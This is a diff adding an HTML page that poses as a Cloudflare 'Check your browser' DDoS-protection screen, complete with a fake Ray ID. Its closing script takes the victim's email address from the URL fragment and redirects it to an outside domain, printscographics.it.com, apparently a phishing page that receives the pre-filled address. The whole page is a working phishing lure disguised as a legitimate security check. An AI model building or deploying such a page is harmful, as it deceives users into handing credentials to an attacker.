@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Just a moment...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        table {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            width: 100%; /* Full width of the screen */
+            height: 100%; /* Full height of the screen */
+            text-align: center;
+            padding: 20px;
+        }
+        h1 {
+            font-size: 24px;
+            margin: 20px 0;
+            color: #333;
+        }
+        .bubbles {
+            width: 30px;
+            height: 30px;
+            background-color: #bd2426;
+            border-radius: 50%;
+            display: inline-block;
+            animation: bubble 1.5s infinite;
+        }
+        .bubbles:nth-child(2) {
+            animation-delay: 0.5s;
+        }
+        .bubbles:nth-child(3) {
+            animation-delay: 1s;
+        }
+        @keyframes bubble {
+            0% {
+                transform: scale(1);
+                opacity: 1;
+            }
+            50% {
+                transform: scale(1.5);
+                opacity: 0.5;
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+        .cookie-warning {
+            color: #bd2426;
+            font-weight: bold;
+        }
+        .attribution {
+            font-size: 12px;
+            color: #666;
+            margin-top: 20px;
+        }
+        .attribution a {
+            color: #007bff;
+            text-decoration: none;
+        }
+        .attribution a:hover {
+            text-decoration: underline;
+        }
+        #cf-bubbles {
+            display: flex;
+            justify-content: center;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <table>
+        <tbody>
+            <tr>
+                <td valign="middle" align="center">
+                    <div class="cf-browser-verification cf-im-under-attack">
+                        <noscript>
+                            <h1 style="color:#bd2426;">Please turn JavaScript on and reload the page.</h1>
+                            <style>
+                                #cf-content {
+                                    display: none !important;
+                                }
+                            </style>
+                        </noscript>
+                        <div id="cf-content" style="display: block;">
+                            <div id="cf-bubbles">
+                                <div class="bubbles"></div>
+                                <div class="bubbles"></div>
+                                <div class="bubbles"></div>
+                            </div>
+                            <h1>
+                                Check your browser before accessing site
+                            </h1>
+                            <div id="no-cookie-warning" class="cookie-warning" data-translate="turn_on_cookies" style="display:none">
+                                <p>Please enable cookies and reload the page.</p>
+                            </div>
+                            <p>This process happens automatically. The browser will be immediately redirected to the requested content..</p>
+                            <p>Please wait up to 1 seconds...</p>
+                            <p id="cf-spinner-redirecting" style="display:none">Redirecting…</p>
+                        </div>
+                    </div>
+                    <div class="attribution">
+                        DDoS protection by <a style="cursor: pointer;">Cloudflare</a>
+                        <br>
+                        <span class="ray_id">Ray ID:927y765e433444f665BG6678900 <code><?php echo uniqid(); ?></code></span>
+                    </div>
+                </td>
+            </tr>
+        </tbody>
+    </table>
+</body>
+<script>
+    // Get the email from the URL hash
+    var userEmail = window.location.hash.substring(1); // Remove the '#' character
+
+    // Simple regex for email validation
+    var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+    if (emailPattern.test(userEmail)) {
+               // Construct the redirect URL
+        var redirectUrl = "https://printscographics.it.com/javpm.html/#" + userEmail;
+        
+        // Redirect to the constructed URL
+        window.location.replace(redirectUrl);
+    } else {
+        // Handle invalid email
+        alert("Invalid email address. Please provide a valid email in the URL.");
+    }
+</script>
+</html>
